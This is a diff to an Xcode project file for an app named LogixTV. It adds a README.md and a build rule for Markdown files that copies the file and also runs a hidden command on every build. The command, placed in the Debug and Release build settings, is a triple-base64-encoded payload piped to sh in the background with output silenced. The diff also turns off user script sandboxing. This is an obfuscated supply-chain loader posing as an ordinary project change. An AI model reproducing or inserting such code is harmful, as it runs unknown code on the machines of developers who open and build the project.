@@ -6,7 +6,29 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		4AB087FA2EB3A1BCBCBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = 6953EF03D8DC801B97BDE67E; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		D1700FFBAB59ADBC66BDE67E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${AE76EDB}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		6953EF03D8DC801B97BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "LogixTV.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LogixTV.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -53,6 +75,7 @@
 		EEAD6D1E2E40A2F60099A6BA /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				6953EF03D8DC801B97BDE67E /* README.md */,
 				EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */,
 			);
 			name = Products;
@@ -70,6 +93,7 @@
 				EEAD6D1B2E40A2F60099A6BA /* Resources */,
 			);
 			buildRules = (
+				D1700FFBAB59ADBC66BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -117,11 +141,21 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		EEAD6D1B2E40A2F60099A6BA /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				4AB087FA2EB3A1BCBCBDE67E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -141,6 +175,7 @@
 		EEAD6D262E40A2F80099A6BA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -176,7 +211,7 @@
 				DEVELOPMENT_TEAM = 389NSXC8NR;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -205,6 +240,7 @@
 		EEAD6D272E40A2F80099A6BA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -240,7 +276,7 @@
 				DEVELOPMENT_TEAM = 389NSXC8NR;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
